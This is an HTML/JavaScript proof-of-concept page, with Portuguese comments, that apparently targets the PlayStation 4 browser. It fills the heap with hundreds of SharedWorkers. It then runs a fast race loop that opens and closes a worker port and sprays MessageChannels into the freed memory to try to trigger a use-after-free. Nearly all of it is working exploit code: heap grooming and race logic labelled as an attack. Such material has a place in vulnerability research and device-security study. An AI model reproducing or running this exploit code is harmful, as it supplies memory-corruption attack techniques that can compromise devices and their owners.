<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 SharedWorker SPRAY PoC</title>
    
</head>
<body>

    <h1>SharedWorker UAF/Spray Test</h1>
    
    <div class="panel">
        <h3>1. Preparação (Encher Heap)</h3>
        Quantidade Base: <input type="number" id="fillAmount" value="400" style="width: 60px;">
        <button id="btnFill" onclick="startFill()">ENCHER MEMÓRIA</button>
    </div>

    <div class="panel">
        <h3>2. Ataque (Race + Spray)</h3>
        <p>Tenta substituir o Worker morto por MessageChannels.</p>
        <button id="btnSpray" onclick="startSpray()" disabled>INICIAR SPRAY LOOP</button>
        <button onclick="stopSpray()">PARAR</button>
    </div>

    <div id="log">Logs do sistema...</div>

    <script>
        const logEl = document.getElementById('log');
        let workers = []; // Mantém os workers vivos
        let sprayKeepers = []; // Mantém os objetos de spray vivos
        let raceInterval = null;
        
        function log(msg) {
            const time = new Date().toLocaleTimeString().split(' ')[0];
            logEl.innerHTML = `[${time}] ${msg}\n` + logEl.innerHTML;
        }

        // --- FASE 1: ENCHIMENTO ---
        async function startFill() {
            const limit = parseInt(document.getElementById('fillAmount').value);
            document.getElementById('btnFill').disabled = true;
            log(`Iniciando enchimento até ${limit}...`);

            let count = 0;
            const batch = setInterval(() => {
                for(let i=0; i<5; i++) {
                    if(count >= limit) {
                        clearInterval(batch);
                        log("Enchimento concluído. Memória pronta.");
                        document.getElementById('btnSpray').disabled = false;
                        return;
                    }
                    try {
                        // Worker vazio apenas para ocupar slot no Kernel
                        const id = `filler_${count}`;
                        const sw = new SharedWorker("data:text/javascript,onconnect=e=>{}", id);
                        sw.port.start();
                        workers.push(sw);
                        count++;
                    } catch(e) {
                        log(`Erro fatal no enchimento (${count}): ${e.message}`);
                        clearInterval(batch);
                    }
                }
                if(count % 50 === 0) log(`Alocados: ${count}/${limit}`);
            }, 10);
        }

        // --- FASE 2: O ATAQUE (RACE + SPRAY) ---
        function startSpray() {
            if(raceInterval) return;
            log("!!! INICIANDO LOOP DE ATAQUE !!!");
            
            let cycle = 0;
            
            raceInterval = setInterval(() => {
                cycle++;
                const id = `target_${Date.now()}_${cycle}`;
                
                try {
                    // 1. ALOCA O ALVO (O 401º Worker)
                    const sw = new SharedWorker("data:text/javascript,onconnect=e=>{}", id);
                    const port = sw.port;
                    
                    // 2. USA O RECURSO (Gatilho para o Kernel olhar para este endereço)
                    port.postMessage("ping"); 

                    // 3. LIBERAÇÃO (O Buraco na Memória)
                    // Fechamos a porta explicitamente
                    port.close();
                    
                    // 4. SPRAY IMEDIATO (Tentar ocupar o buraco)
                    // Criamos vários canais IPC leves. Se o Kernel reutilizar o ID do worker
                    // para um desses canais, bingo.
                    for(let i=0; i < 20; i++) {
                        const mc = new MessageChannel();
                        // Mantemos referência para o GC não limpar imediatamente
                        // Mas usamos um array circular pequeno para não estourar a RAM do navegador
                        sprayKeepers[i % 500] = mc; 
                    }

                } catch(e) {
                    // Ignora erros de alocação (esperados no limite)
                }

                if(cycle % 100 === 0) log(`Ciclo ${cycle}: Tentando corrupção...`);

            }, 5); // Tenta a cada 5ms (Agressivo)
        }

        function stopSpray() {
            clearInterval(raceInterval);
            raceInterval = null;
            log("Ataque parado.");
        }
    </script>
</body>
</html>
